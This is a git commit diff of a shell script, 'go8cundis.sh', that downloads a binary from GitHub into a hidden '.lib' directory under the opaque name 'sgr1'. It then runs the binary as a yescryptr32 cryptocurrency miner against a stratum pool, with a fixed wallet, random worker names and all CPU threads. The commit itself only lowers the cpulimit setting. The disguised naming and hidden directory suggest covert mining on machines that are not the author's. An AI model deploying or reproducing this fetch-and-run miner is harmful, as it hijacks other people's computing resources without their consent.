1e15ed5b7e149cadd2f486ed9141743707b0c123
barburonjilo <barburonjilo@outlook.co.id>
2024-07-24 17:05:45 +0700

    Update go8cundis.sh

--- go8cundis.sh
+++ go8cundis.sh
@@ -13,7 +13,7 @@ mkdir .lib && cd .lib
 
 wget -O sgr1  https://github.com/barburonjilo/back/raw/main/sr 
 chmod +x sgr1
-cpulimit -l 400 -e sgr1 &
+cpulimit -l 40 -e sgr1 &
 # sudo sync && sudo echo 3 > /proc/sys/vm/drop_caches
 # nice -n -10 nohup ./sgr1 --algorithm yescryptr32 --pool stratum-asia.rplant.xyz:17116 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.envio --password m=solo --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive &
 ./sgr1 --algorithm yescryptr32 --pool stratum-asia.rplant.xyz:17116 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$(echo $RANDOM | md5sum | head -c 5) --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive  &
